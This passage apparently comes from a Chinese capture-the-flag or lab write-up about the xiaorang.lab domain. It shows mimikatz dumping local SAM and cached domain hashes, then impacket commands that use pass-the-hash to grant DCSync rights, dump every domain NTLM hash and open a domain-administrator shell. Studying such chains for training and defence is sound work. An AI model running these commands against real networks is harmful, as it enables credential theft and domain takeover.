+	 * Password : 67 c0 d3 cb 67 ac a6 41 f1 4a 38 8a 5d f4 dd 70 be 23 41 49 1a 5a e8 51 6b 7e 25 18 34 a5 eb 76 ae e6 7a 10 2e 8c 49 28 ca c4 1f 9c 2a 22 e9 0d dd 19 83 d5 06 bc a1 15 7b e0 6d ed 24 94 98 a4 2a f8 76 f2 57 f9 e4 ee aa c5 3d d8 bc 29 e5 60 35 bd e5 35 20 41 0f a1 56 5f 23 70 92 91 e2 a2 46 49 a0 26 d1 fb 27 d7 1e 07 57 ab 7f d5 4b f9 e7 4b 33 7b fd 46 2d e1 d3 b1 1c 6c dc f6 54 da ce d6 b3 f4 c8 ab 86 5e 99 12 35 46 8f 33 46 0c 3f ba 48 a6 b2 83 06 95 23 c2 40 b1 e4 57 72 7c 68 96 9f 4a 59 59 54 d4 74 f7 33 c6 8b 74 50 aa 31 33 98 b5 47 b6 b7 fc 82 c4 e7 fc 56 e5 1a b2 2e 5d 4e dc 96 81 cb fe e2 fc a7 e6 2d 66 58 ee 07 c5 00 11 87 af 6e 9c 46 f1 0f 37 af 46 90 b5 9a 04 93 63 e9 13 0e 51 d9 86 a3 88 6b 8b 3d f9 
+	ssp :	
+	credman :	
+
+mimikatz(commandline) # lsadump::sam
+Domain : WIN-HAUWOLAO
+SysKey : 266305bc15dc94a36318ed2b13690e72
+Local SID : S-1-5-21-2057596273-973658165-3030246172
+
+SAMKey : 0941c1bdd7b6672a68a0179daca79d16
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: bf967c5a0f7256e2eaba589fbd29a382
+    lm  - 0: 0349d02ce1cf8197866ecbc2a0fc1c03
+    lm  - 1: 8845b3464afcad1365bfed1fb4b02b90
+    ntlm- 0: bf967c5a0f7256e2eaba589fbd29a382
+    ntlm- 1: bf967c5a0f7256e2eaba589fbd29a382
+    ntlm- 2: bf967c5a0f7256e2eaba589fbd29a382
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+mimikatz(commandline) # lsadump::cache
+Domain : WIN-HAUWOLAO
+SysKey : 266305bc15dc94a36318ed2b13690e72
+
+Local name : WIN-HAUWOLAO ( S-1-5-21-2057596273-973658165-3030246172 )
+Domain name : XIAORANG ( S-1-5-21-3269458654-3569381900-10559451 )
+Domain FQDN : xiaorang.lab
+
+Policy subsystem is : 1.14
+LSA Key(s) : 1, default {dd56a9cd-b40d-c7f0-a8d3-b1bf9cecb01f}
+  [00] {dd56a9cd-b40d-c7f0-a8d3-b1bf9cecb01f} ed4feff4fcd59d38853d62cbd7009a86bc42dcdfc5c23052d04305348c32415e
+
+* Iteration is set to default (10240)
+
+[NL$1 - 2026/9/22 19:05:03]
+RID       : 00000451 (1105)
+User      : XIAORANG\chenglei
+MsCacheV2 : 14b428c86f22a180ea35fe4875bafc88
+
+[NL$2 - 2026/9/22 18:53:27]
+RID       : 00000450 (1104)
+User      : XIAORANG\zhangwen
+MsCacheV2 : 0b8d44b414415643200b02d72718630a
+
+mimikatz(commandline) # exit
+Bye!
+
+```
+
+拿到chenglei的ntlmhash，以他的身份给zhangwen权限
+
+```zsh
+┌──(.venv3)─(root㉿MJ)-[/tmp/test/goad/BloodHound.py]
+└─# pc -q impacket-dacledit -action write -rights DCSync -principal Zhangwen -target-dn 'DC=xiaorang,DC=lab' 'xiaorang.lab/chenglei' -hashes :0c00801c30594a1b8eaa889d237c5382 -dc-ip 172.22.13.6
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
+
+[*] DACL backed up to dacledit-20260922-190817.bak
+[*] DACL modified successfully!
+
+
+┌──(.venv3)─(root㉿MJ)-[/tmp/test/goad/BloodHound.py]
+└─# pc -q impacket-secretsdump xiaorang.lab/zhangwen:QT62f3gBhK1@172.22.13.6 -just-dc-ntlm
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:6341235defdaed66fb7b682665752c9a:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cb976ec1a1bf8a14a15142c6fecc540e:::
+zhangwen:1104:aad3b435b51404eeaad3b435b51404ee:fa7d776fdfc82d3f43c9d8b7f5312d77:::
+chenglei:1105:aad3b435b51404eeaad3b435b51404ee:0c00801c30594a1b8eaa889d237c5382:::
+zhangtao:1106:aad3b435b51404eeaad3b435b51404ee:e786c4a4987ced162c496d0519496729:::
+WIN-DC$:1000:aad3b435b51404eeaad3b435b51404ee:290bf28241a6a7dc6fb9419d32864588:::
+WIN-HAUWOLAO$:1103:aad3b435b51404eeaad3b435b51404ee:025c40a0a6deeb361b4ad5da2816ce42:::
+[*] Cleaning up...
+```
+
+拿到域管hash横向即可
+
+```zsh
+┌──(.venv3)─(root㉿MJ)-[/tmp/test/goad/BloodHound.py]
+└─# pc -q impacket-wmiexec xiaorang.lab/administrator@172.22.13.6 -hashes :6341235defdaed66fb7b682665752c9a -dc-ip 172.22.13.6
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+xiaorang\administrator
+```
+
+</body>
+</html>
